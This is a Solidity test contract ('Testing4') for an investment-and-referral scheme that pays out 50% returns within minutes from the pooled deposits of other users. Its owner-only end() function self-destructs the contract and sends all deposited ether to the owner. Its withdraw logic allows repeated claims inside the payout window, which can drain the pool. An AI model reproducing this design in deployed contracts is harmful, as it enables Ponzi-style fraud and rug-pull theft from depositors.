1 pragma solidity ^0.4.24;
2 
3 /**
4 *
5 Testing Contract
6 */
7 contract Testing4 {
8 
9     using SafeMath for uint256;
10 
11     mapping(address => uint256) investments;
12     mapping(address => uint256) joined;
13     mapping(address => uint256) withdrawals;
14     mapping(address => uint256) referrer;
15     
16     uint256 public step = 50;
17     uint256 public minimum = 10 finney;
18     uint256 public stakingRequirement = 0.25 ether;
19     address public ownerWallet;
20     address public owner;
21     
22     event Invest(address investor, uint256 amount);
23     event Withdraw(address investor, uint256 amount);
24     event Bounty(address hunter, uint256 amount);
25     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
26 
27     /**
28      * @dev ?onstructor Sets the original roles of the contract
29      */
30 
31     constructor() public {
32         owner = msg.sender;
33         ownerWallet = msg.sender;
34     }
35 
36     /**
37      * @dev Modifiers
38      */
39 
40     modifier onlyOwner() {
41         require(msg.sender == owner);
42         _;
43     }
44 
45     /**
46      * @dev Allows current owner to transfer control of the contract to a newOwner.
47      * @param newOwner The address to transfer ownership to.
48      * @param newOwnerWallet The address to transfer ownership to.
49      */
50     function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {
51         require(newOwner != address(0));
52         emit OwnershipTransferred(owner, newOwner);
53         owner = newOwner;
54         ownerWallet = newOwnerWallet;
55     }
56 
57     /**
58      * @dev Investments
59      */
60     function () public payable {
61         buy(0x0);
62     }
63 
64     function buy(address _referredBy) public payable {
65         require(msg.value >= minimum);
66 
67         address _customerAddress = msg.sender;
68 
69         if(
70            // is this a referred purchase?
71            _referredBy != 0x0000000000000000000000000000000000000000 &&
72 
73            // no cheating!
74            _referredBy != _customerAddress &&
75 
76            // does the referrer have at least X whole tokens?
77            // i.e is the referrer a godly chad masternode
78            investments[_referredBy] >= stakingRequirement
79        ){
80            // wealth redistribution
81            referrer[_referredBy] = referrer[_referredBy].add(msg.value.mul(5).div(100));
82        }
83 
84        if (investments[msg.sender] > 0){
85            if (withdraw()){
86                withdrawals[msg.sender] = 0;
87            }
88        }
89        investments[msg.sender] = investments[msg.sender].add(msg.value);
90        joined[msg.sender] = block.timestamp;
91        ownerWallet.transfer(msg.value.mul(5).div(100));
92        emit Invest(msg.sender, msg.value);
93     }
94 
95     /**
96     * @dev Evaluate current balance
97     * @param _address Address of investor
98     */
99     function getBalance(address _address) view public returns (uint256) {
100         uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
101         if (minutesCount > 5 && minutesCount < 10) {
102         uint256 balance = investments[_address].mul(step).div(100);
103         return balance;
104         }
105 }
106 
107 function getMinutes(address _address) view public returns (uint256) {
108     
109     
110         uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
111         
112          return minutesCount;
113        
114     }
115     
116     
117 function end() public onlyOwner {
118 
119 if(msg.sender == owner) { // Only let the contract creator do this
120         selfdestruct(owner); // Makes contract inactive, returns funds
121     }
122        
123     }
124 
125     /**
126     * @dev Withdraw dividends from contract
127     */
128     function withdraw() public returns (bool){
129         require(joined[msg.sender] > 0);
130         uint256 balance = getBalance(msg.sender);
131         if (address(this).balance > balance){
132             if (balance > 0){
133                 withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);
134                 msg.sender.transfer(balance);
135                 emit Withdraw(msg.sender, balance);
136             }
137             return true;
138         } else {
139             return false;
140         }
141     }
142 
143     /**
144     * @dev Bounty reward
145     */
146     function bounty() public {
147         uint256 refBalance = checkReferral(msg.sender);
148         if(refBalance >= minimum) {
149              if (address(this).balance > refBalance) {
150                 referrer[msg.sender] = 0;
151                 msg.sender.transfer(refBalance);
152                 emit Bounty(msg.sender, refBalance);
153              }
154         }
155     }
156 
157     /**
158     * @dev Gets balance of the sender address.
159     * @return An uint256 representing the amount owned by the msg.sender.
160     */
161     function checkBalance() public view returns (uint256) {
162         return getBalance(msg.sender);
163     }
164 
165     /**
166     * @dev Gets withdrawals of the specified address.
167     * @param _investor The address to query the the balance of.
168     * @return An uint256 representing the amount owned by the passed address.
169     */
170     function checkWithdrawals(address _investor) public view returns (uint256) {
171         return withdrawals[_investor];
172     }
173 
174     /**
175     * @dev Gets investments of the specified address.
176     * @param _investor The address to query the the balance of.
177     * @return An uint256 representing the amount owned by the passed address.
178     */
179     function checkInvestments(address _investor) public view returns (uint256) {
180         return investments[_investor];
181     }
182 
183     /**
184     * @dev Gets referrer balance of the specified address.
185     * @param _hunter The address of the referrer
186     * @return An uint256 representing the referral earnings.
187     */
188     function checkReferral(address _hunter) public view returns (uint256) {
189         return referrer[_hunter];
190     }
191 }
192 
193 /**
194  * @title SafeMath
195  * @dev Math operations with safety checks that throw on error
196  */
197 library SafeMath {
198     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
199         if (a == 0) {
200             return 0;
201         }
202         uint256 c = a * b;
203         assert(c / a == b);
204         return c;
205     }
206 
207     function div(uint256 a, uint256 b) internal pure returns (uint256) {
208         // assert(b > 0); // Solidity automatically throws when dividing by 0
209         uint256 c = a / b;
210         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
211         return c;
212     }
213 
214     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
215         assert(b <= a);
216         return a - b;
217     }
218 
219     function add(uint256 a, uint256 b) internal pure returns (uint256) {
220         uint256 c = a + b;
221         assert(c >= a);
222         return c;
223     }
224 }